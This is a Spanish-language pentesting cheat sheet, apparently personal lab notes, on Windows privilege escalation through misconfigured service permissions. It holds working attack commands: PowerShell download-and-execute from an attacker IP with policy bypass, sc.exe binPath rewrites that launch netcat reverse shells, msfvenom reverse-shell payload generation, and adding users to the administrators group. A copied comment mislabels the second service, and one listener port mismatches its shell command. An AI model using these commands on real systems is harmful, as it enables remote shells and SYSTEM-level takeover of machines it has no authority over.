# Escalación de privilegios en Windows

Tags: #Windows #PrivEsc

Privilege Escalation (Privesc) — proceso de elevar privilegios desde un acceso inicial limitado hacia un usuario de mayor privilegio (root en Linux, SYSTEM/Administrator en Windows). Es el paso entre el foothold y la post-explotación. Sin privesc el acceso es restringido; con privesc se obtiene control total de la máquina para volcar hashes, leer archivos protegidos y moverse lateralmente.

## Identificación de vulnerabilidades 

* [Escalacion-Privilegios-Payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
* [PrivescCheck](https://github.com/itm4n/PrivescCheck)

```bash 
# Cargar en memoria  <- MEJOR OPCIÓN  
❯ powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://<IP_KALI>/PrivescCheck.ps1');Invoke-PrivescCheck > PrivescCheck.log 

# Cargar en disco 
❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP_Kali/PrivescCheck.ps1','PrivescCheck.ps1')"
❯ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"   # Ejecutar en la máquina víctima Windows   
```

## PrivEsc - Services Permissions 

```powershell 
# El usuario kanon puede modificar la configuración del servicio wuauserv (Windows Update) que corre como LocalSystem — eso es privesc directo.

????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Services - Permissions                            ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has any write permissions on  ?
? a service through the Service Control Manager (SCM).         ?
????????????????????????????????????????????????????????????????


Name              : wuauserv = <service>
DisplayName       : @C:\Windows\system32\wuaueng.dll,-105
User              : LocalSystem
ImagePath         : C:\Windows\system32\svchost.exe -k netsvcs -p
StartMode         : Manual
Type              : Win32ShareProcess
RegistryKey       : HKLM\SYSTEM\CurrentControlSet\Services
RegistryPath      : HKLM\SYSTEM\CurrentControlSet\Services\wuauserv
Status            : Stopped
UserCanStart      : True
UserCanStop       : True
IdentityReference : LAINOSCP\kanon (S-1-5-21-2387301235-874641830-263055908-1105)
Permissions       : ChangeConfig, Start, Stop



[*] STATUS  : VULNERABLE (High)
[*] TIME    : 00:00:09.002
[*] SUMMARY : No summary available yet.
```

```powershell 
Forma 1:    <- MEJOR OPCIÓN 
# Subir nc.exe a la máquina
❯ sc.exe config <service> binPath= "cmd.exe /c start /b C:\Temp\nc64.exe -e cmd IP_Kali 4444"

# Listener en Kali
❯ rlwrap nc -lvnp 4444

# Arrancas el servicio
❯ sc.exe start <service>
```

```powershell 
Forma 2:
# Agregar al usuario 'student' al grupo administradores 
❯ sc.exe config <service> binPath= "cmd.exe /c net localgroup administrators student /add"

# Iniciar el servicio para ejecutar el comando
❯ sc.exe start <service>

NOTA:
	- Si no funciona el comando de 'iniciar el servicio'... lo mejor es cerrar la sesión y volverla a iniciar para que haga efecto 
```


```powershell 
Forma 3: Desde Kali 
Paso 1:
# Crear el ejecutable malicioso y compartirlo 
❯ msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=eth0 LPORT=445 -f exe > shell.exe

Paso 2:
# Modificar el binpath 
❯ sc.exe config <service> binPath= "C:\Windows\System32\cmd.exe /c C:\Temp\shell.exe"

Paso 3: 
# Modo escucha para recibir la revershell 
❯ rlwrap nc -nlvp 445  

Paso 4:
# Ejecutar la shell desde /Temp 
❯ sc.exe start <service>
```

## PrivEsc - 

```powershell 
# El usuario kanon puede modificar la configuración del servicio wuauserv (Windows Update) que corre como LocalSystem — eso es privesc directo.

????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Services - Permissions                            ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has any write permissions on  ?
? a service through the Service Control Manager (SCM).         ?
????????????????????????????????????????????????????????????????

Name              : WebAPIService = <service>
DisplayName       : Web API Service
User              : LocalSystem
ImagePath         : C:\Services\WebAPI\webapi-svc.exe
StartMode         : Manual
Type              : Win32OwnProcess
RegistryKey       : HKLM\SYSTEM\CurrentControlSet\Services
RegistryPath      : HKLM\SYSTEM\CurrentControlSet\Services\WebAPIService
Status            : Stopped
UserCanStart      : False
UserCanStop       : False
IdentityReference : HACK-ACADEMY\svc_webapi (S-1-5-21-1006770658-2633334449-451426994-1103)
Permissions       : AllAccess
```

```powershell 
# Forma 1 

Paso 1:
# Crear el ejecutable malicioso y compartirlo desde Kali
❯ msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=eth0 LPORT=443 -f exe > shell.exe

Paso 2:
# Reemplazar el binario dentro de la máquina Windows vulnerable e iniciar 
❯ sc.exe config WebAPIService binPath= "C:\Temp\shell.exe"
❯ sc.exe query WebAPIService
❯ sc.exe qc WebAPIService     # Verificar el cambio

Paso 3:
# Ponerse en escucha en Kali 
❯ nc -lvnp 443

Paso 4:
# Iniciar el servicio 
❯ sc.exe start WebAPIService
```

```powershell 
# Forma 2 

# agregr a un usuario al grupo administrators 
❯ sc.exe config WebAPIService binPath= "cmd.exe /c net localgroup administrators svc_webapi /add"
❯ sc.exe start WebAPIService
```

```powershell 
# Forma 3 

# Revershell directa con Netcat 
❯ sc.exe config WebAPIService binPath= "C:\Temp\nc.exe TU_IP 4446 -e cmd.exe"
❯ sc.exe start WebAPIService

❯ nc -lvnp 4445
```